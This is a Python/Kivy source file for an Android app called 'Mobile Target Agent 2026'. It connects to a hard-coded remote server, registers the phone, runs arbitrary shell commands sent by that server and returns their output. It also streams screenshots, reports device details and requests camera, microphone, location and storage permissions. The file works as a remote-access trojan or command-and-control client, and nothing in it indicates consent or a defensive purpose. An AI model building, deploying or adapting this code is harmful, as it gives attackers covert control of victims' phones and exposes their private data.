#!/usr/bin/env python3
"""
MOBILE TARGET AGENT 2026 - APK VERSION
Advanced mobile remote control agent for Android
Happy New Year 2026!
"""
import time
import threading
import subprocess
import os
import base64
import io
import sys
import platform
import random
import json
import socket
import tempfile
import shutil
from pathlib import Path

# Kivy imports for Android GUI
try:
    from kivy.app import App
    from kivy.uix.boxlayout import BoxLayout
    from kivy.uix.label import Label
    from kivy.uix.button import Button
    from kivy.uix.textinput import TextInput
    from kivy.uix.popup import Popup
    from kivy.uix.progressbar import ProgressBar
    from kivy.clock import Clock
    from kivy.logger import Logger
    import socketio
    import requests
except ImportError as e:
    print(f"❌ Missing dependency: {e}")
    print("📦 Installing dependencies...")
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'kivy', 'python-socketio[client]', 'requests'], check=True)
    from kivy.app import App
    from kivy.uix.boxlayout import BoxLayout
    from kivy.uix.label import Label
    from kivy.uix.button import Button
    from kivy.uix.textinput import TextInput
    from kivy.uix.popup import Popup
    from kivy.uix.progressbar import ProgressBar
    from kivy.clock import Clock
    from kivy.logger import Logger
    import socketio
    import requests

class MobileTargetAgent2026:
    def __init__(self):
        print("🎉 MOBILE TARGET AGENT 2026 STARTING...")
        print("📱 Happy New Year 2026!")
        
        # VPS Configuration
        self.vps_url = "http://88.222.213.177:8080"
        self.agent_id = f"mobile_target_2026_{random.randint(1000, 9999)}"
        
        # Agent settings
        self.running = False
        self.connected = False
        self.connection_stable = False
        self.screen_active = False
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 50
        
        # Initialize SocketIO
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=self.max_reconnect_attempts,
            reconnection_delay=2,
            reconnection_delay_max=10,
            logger=False,
            engineio_logger=False
        )
        
        self.setup_events()
        
    def setup_events(self):
        """Setup SocketIO event handlers"""
        
        @self.sio.event
        def connect():
            print("✅ Connected to VPS server")
            self.connected = True
            self.connection_stable = True
            self.reconnect_attempts = 0
            
            # Register as mobile agent
            threading.Thread(target=self.register_agent, daemon=True).start()
        
        @self.sio.event
        def disconnect():
            print("❌ Disconnected from VPS server")
            self.connected = False
            self.connection_stable = False
        
        @self.sio.event
        def connect_error(data):
            print(f"❌ Connection error: {data}")
            self.connected = False
            self.connection_stable = False
        
        # Command execution
        @self.sio.event
        def execute_command(data):
            print(f"💻 RECEIVED execute_command: {data}")
            command = data.get('command', '') if isinstance(data, dict) else str(data)
            threading.Thread(target=self.execute_command, args=(command,), daemon=True).start()
        
        @self.sio.event
        def send_command_to_agent(data):
            print(f"💻 RECEIVED send_command_to_agent: {data}")
            command = data.get('command', '') if isinstance(data, dict) else str(data)
            threading.Thread(target=self.execute_command, args=(command,), daemon=True).start()
        
        # Screen sharing
        @self.sio.event
        def StartEnhancedScreen(data):
            print(f"📺 RECEIVED StartEnhancedScreen: {data}")
            threading.Thread(target=self.start_screen_sharing, daemon=True).start()
        
        @self.sio.event
        def StopEnhancedScreen(data):
            print(f"📺 RECEIVED StopEnhancedScreen: {data}")
            self.stop_screen_sharing()
        
        @self.sio.event
        def TakeScreenshot(data):
            print(f"📸 RECEIVED TakeScreenshot: {data}")
            threading.Thread(target=self.take_screenshot, daemon=True).start()
        
        # System info
        @self.sio.event
        def GetSystemInfo(data):
            print(f"ℹ️ RECEIVED GetSystemInfo: {data}")
            threading.Thread(target=self.get_system_info, daemon=True).start()
        
        # Messages
        @self.sio.event
        def ShowMessage(data):
            print(f"💬 RECEIVED ShowMessage: {data}")
            message = data.get('message', '') if isinstance(data, dict) else str(data)
            threading.Thread(target=self.show_message, args=(message,), daemon=True).start()
    
    def register_agent(self):
        """Register as enhanced mobile agent"""
        try:
            print("📡 Registering mobile agent...")
            
            # Get device info
            device_info = self.get_device_info()
            
            registration_data = {
                'agent_id': self.agent_id,
                'agent_type': 'mobile',
                'capabilities': ['screen_sharing', 'commands', 'messages', 'system_info'],
                'platform': 'Android',
                'device_info': device_info,
                'enhanced_mode': True,
                'mobile_features': True,
                'version': '2026.1.0'
            }
            
            # Send registration
            self.sio.emit('RegisterEnhancedAgent', registration_data)
            self.sio.emit('register_agent', registration_data)
            
            print("✅ Mobile agent registered successfully")
            
        except Exception as e:
            print(f"❌ Registration error: {e}")
    
    def get_device_info(self):
        """Get Android device information"""
        try:
            device_info = {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'hostname': platform.node(),
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'device_type': 'Android Mobile',
                'agent_version': '2026.1.0'
            }
            
            # Try to get Android-specific info
            try:
                import android
                from android.permissions import request_permissions, Permission
                
                # Request necessary permissions
                request_permissions([
                    Permission.WRITE_EXTERNAL_STORAGE,
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.CAMERA,
                    Permission.RECORD_AUDIO,
                    Permission.ACCESS_FINE_LOCATION,
                    Permission.ACCESS_COARSE_LOCATION
                ])
                
                device_info['android_permissions'] = 'Requested'
                device_info['platform'] = 'Android'
                
            except ImportError:
                device_info['android_permissions'] = 'Not available'
            
            return device_info
            
        except Exception as e:
            print(f"⚠️ Device info error: {e}")
            return {'error': str(e)}
    
    def execute_command(self, command):
        """Execute system command on Android"""
        try:
            print(f"💻 EXECUTING: {command}")
            
            # Android-specific commands
            if command.lower() in ['screenshot', 'screen']:
                self.take_screenshot()
                return
            elif command.lower() in ['info', 'system', 'device']:
                self.get_system_info()
                return
            elif command.lower().startswith('message:'):
                message = command[8:].strip()
                self.show_message(message)
                return
            
            # Try to execute shell command
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                output = result.stdout if result.stdout else result.stderr
                if not output:
                    output = f"Command executed (exit code: {result.returncode})"
                
                print(f"✅ Command result: {output[:200]}...")
                
                # Send result
                self.sio.emit('command_result_received', {
                    'agent_id': self.agent_id,
                    'command': command,
                    'result': output,
                    'agent_type': 'mobile',
                    'timestamp': time.time()
                })
                
            except subprocess.TimeoutExpired:
                error_msg = f"Command timeout after 30 seconds"
                print(f"⚠️ {error_msg}")
                self.sio.emit('command_result_received', {
                    'agent_id': self.agent_id,
                    'command': command,
                    'result': error_msg,
                    'agent_type': 'mobile',
                    'timestamp': time.time()
                })
            
        except Exception as e:
            error_msg = f"Command execution error: {e}"
            print(f"❌ {error_msg}")
            self.sio.emit('command_result_received', {
                'agent_id': self.agent_id,
                'command': command,
                'result': error_msg,
                'agent_type': 'mobile',
                'timestamp': time.time()
            })
    
    def start_screen_sharing(self):
        """Start mobile screen sharing"""
        if self.screen_active:
            print("⚠️ Screen sharing already active")
            return
        
        print("📺 Starting mobile screen sharing...")
        self.screen_active = True
        
        # Start screen sharing thread
        threading.Thread(target=self.screen_sharing_thread, daemon=True).start()
    
    def stop_screen_sharing(self):
        """Stop screen sharing"""
        print("📺 Stopping screen sharing...")
        self.screen_active = False
    
    def screen_sharing_thread(self):
        """Mobile screen sharing thread"""
        print("📱 Mobile screen sharing thread started")
        frame_count = 0
        
        while self.screen_active and self.running:
            try:
                if not self.connected or not self.connection_stable:
                    print("⚠️ Connection unstable - pausing screen sharing")
                    time.sleep(2)
                    continue
                
                # Take screenshot
                screenshot_data = self.capture_screen()
                
                if screenshot_data:
                    # Send frame
                    self.sio.emit('EnhancedScreenFrame', [self.agent_id, screenshot_data])
                    frame_count += 1
                    
                    if frame_count % 10 == 0:
                        print(f"📺 {frame_count} mobile frames sent")
                
                # Wait for next frame (lower FPS for mobile)
                time.sleep(2.0)  # 0.5 FPS for mobile
                
            except Exception as e:
                print(f"⚠️ Screen sharing error: {e}")
                time.sleep(1)
        
        self.screen_active = False
        print("📱 Mobile screen sharing thread ended")
    
    def capture_screen(self):
        """Capture mobile screen"""
        try:
            # Try Android screenshot
            try:
                import android
                from android.permissions import request_permissions, Permission
                
                # Request screenshot permission
                request_permissions([Permission.WRITE_EXTERNAL_STORAGE])
                
                # Take screenshot using Android API
                screenshot_path = "/sdcard/screenshot_temp.png"
                os.system(f"screencap -p {screenshot_path}")
                
                if os.path.exists(screenshot_path):
                    with open(screenshot_path, 'rb') as f:
                        screenshot_data = base64.b64encode(f.read()).decode()
                    os.remove(screenshot_path)
                    return screenshot_data
                
            except ImportError:
                pass
            
            # Fallback: Create dummy screenshot
            dummy_screenshot = self.create_dummy_screenshot()
            return dummy_screenshot
            
        except Exception as e:
            print(f"❌ Screenshot error: {e}")
            return None
    
    def create_dummy_screenshot(self):
        """Create dummy screenshot for testing"""
        try:
            from PIL import Image, ImageDraw, ImageFont
            
            # Create image
            img = Image.new('RGB', (720, 1280), color='#2196F3')
            draw = ImageDraw.Draw(img)
            
            # Add text
            try:
                font = ImageFont.truetype("arial.ttf", 40)
            except:
                font = ImageFont.load_default()
            
            text = f"📱 Mobile Agent 2026\n{self.agent_id}\n{time.strftime('%H:%M:%S')}"
            draw.multiline_text((50, 500), text, fill='white', font=font, align='center')
            
            # Convert to base64
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=70)
            screenshot_data = base64.b64encode(buffer.getvalue()).decode()
            
            return screenshot_data
            
        except Exception as e:
            print(f"❌ Dummy screenshot error: {e}")
            return None
    
    def take_screenshot(self):
        """Take single screenshot"""
        try:
            print("📸 Taking mobile screenshot...")
            screenshot_data = self.capture_screen()
            
            if screenshot_data:
                self.sio.emit('Screenshot', [self.agent_id, screenshot_data])
                print("✅ Screenshot sent")
            else:
                print("❌ Screenshot failed")
                
        except Exception as e:
            print(f"❌ Screenshot error: {e}")
    
    def get_system_info(self):
        """Get mobile system information"""
        try:
            print("ℹ️ Getting mobile system info...")
            
            system_info = {
                'agent_id': self.agent_id,
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'hostname': platform.node(),
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'device_type': 'Android Mobile',
                'agent_version': '2026.1.0',
                'timestamp': time.time()
            }
            
            # Try to get Android-specific info
            try:
                import android
                system_info['android_api'] = 'Available'
                system_info['platform'] = 'Android'
            except ImportError:
                system_info['android_api'] = 'Not available'
            
            # Send system info
            self.sio.emit('SystemInfo', [self.agent_id, system_info])
            print("✅ System info sent")
            
        except Exception as e:
            print(f"❌ System info error: {e}")
            self.sio.emit('SystemInfo', [self.agent_id, {'error': str(e)}])
    
    def show_message(self, message):
        """Show message on mobile device"""
        try:
            print(f"💬 Showing message: {message}")
            
            # Send message result
            self.sio.emit('MessageResult', [self.agent_id, f"Message displayed: {message}"])
            print("✅ Message result sent")
            
        except Exception as e:
            print(f"❌ Message error: {e}")
            self.sio.emit('MessageResult', [self.agent_id, f"Message error: {e}"])
    
    def connect_to_vps(self):
        """Connect to VPS server"""
        try:
            print(f"🌐 Connecting to VPS: {self.vps_url}")
            self.sio.connect(self.vps_url)
            return True
        except Exception as e:
            print(f"❌ Connection failed: {e}")
            return False
    
    def start(self):
        """Start the mobile agent"""
        print("🚀 Starting Mobile Target Agent 2026...")
        self.running = True
        
        # Connect to VPS
        if self.connect_to_vps():
            print("✅ Mobile agent started successfully")
            
            # Keep alive
            try:
                while self.running:
                    if not self.connected:
                        print("🔄 Attempting reconnection...")
                        self.connect_to_vps()
                    time.sleep(10)
            except KeyboardInterrupt:
                print("⏹️ Stopping mobile agent...")
                self.stop()
        else:
            print("❌ Failed to start mobile agent")
    
    def stop(self):
        """Stop the mobile agent"""
        print("⏹️ Stopping Mobile Target Agent 2026...")
        self.running = False
        self.screen_active = False
        
        try:
            self.sio.disconnect()
        except:
            pass
        
        print("✅ Mobile agent stopped")

class MobileAgentApp(App):
    """Kivy app for mobile agent"""
    
    def build(self):
        self.title = "🎉 Mobile Agent 2026"
        
        # Main layout
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        # Title
        title = Label(
            text="🎉 Happy New Year 2026!\n📱 Mobile Target Agent",
            font_size=24,
            size_hint_y=0.2,
            halign='center'
        )
        layout.add_widget(title)
        
        # Status
        self.status_label = Label(
            text="Status: Starting...",
            font_size=16,
            size_hint_y=0.1
        )
        layout.add_widget(self.status_label)
        
        # Agent ID
        self.agent_id_label = Label(
            text="Agent ID: Initializing...",
            font_size=14,
            size_hint_y=0.1
        )
        layout.add_widget(self.agent_id_label)
        
        # Progress bar
        self.progress = ProgressBar(
            max=100,
            value=0,
            size_hint_y=0.1
        )
        layout.add_widget(self.progress)
        
        # Buttons
        button_layout = BoxLayout(orientation='horizontal', size_hint_y=0.2, spacing=10)
        
        self.start_btn = Button(
            text="🚀 Start Agent",
            font_size=16
        )
        self.start_btn.bind(on_press=self.start_agent)
        button_layout.add_widget(self.start_btn)
        
        self.stop_btn = Button(
            text="⏹️ Stop Agent",
            font_size=16,
            disabled=True
        )
        self.stop_btn.bind(on_press=self.stop_agent)
        button_layout.add_widget(self.stop_btn)
        
        layout.add_widget(button_layout)
        
        # Log area
        self.log_text = TextInput(
            text="📱 Mobile Target Agent 2026 Ready\n🎉 Happy New Year 2026!\n",
            multiline=True,
            readonly=True,
            size_hint_y=0.4
        )
        layout.add_widget(self.log_text)
        
        # Initialize agent
        self.agent = None
        
        return layout
    
    def start_agent(self, instance):
        """Start the mobile agent"""
        try:
            self.log("🚀 Starting mobile agent...")
            self.status_label.text = "Status: Starting..."
            self.start_btn.disabled = True
            
            # Create and start agent
            self.agent = MobileTargetAgent2026()
            self.agent_id_label.text = f"Agent ID: {self.agent.agent_id}"
            
            # Start agent in background thread
            threading.Thread(target=self.agent.start, daemon=True).start()
            
            # Update UI
            self.status_label.text = "Status: Running"
            self.stop_btn.disabled = False
            self.progress.value = 100
            
            self.log("✅ Mobile agent started successfully!")
            
        except Exception as e:
            self.log(f"❌ Failed to start agent: {e}")
            self.status_label.text = "Status: Error"
            self.start_btn.disabled = False
    
    def stop_agent(self, instance):
        """Stop the mobile agent"""
        try:
            self.log("⏹️ Stopping mobile agent...")
            self.status_label.text = "Status: Stopping..."
            
            if self.agent:
                self.agent.stop()
            
            # Update UI
            self.status_label.text = "Status: Stopped"
            self.start_btn.disabled = False
            self.stop_btn.disabled = True
            self.progress.value = 0
            
            self.log("✅ Mobile agent stopped")
            
        except Exception as e:
            self.log(f"❌ Failed to stop agent: {e}")
    
    def log(self, message):
        """Add message to log"""
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.text += f"[{timestamp}] {message}\n"
        
        # Scroll to bottom
        self.log_text.cursor = (len(self.log_text.text), 0)

# Main entry point
if __name__ == '__main__':
    print("🎉 MOBILE TARGET AGENT 2026 - APK VERSION")
    print("📱 Happy New Year 2026!")
    
    # Run Kivy app
    MobileAgentApp().run()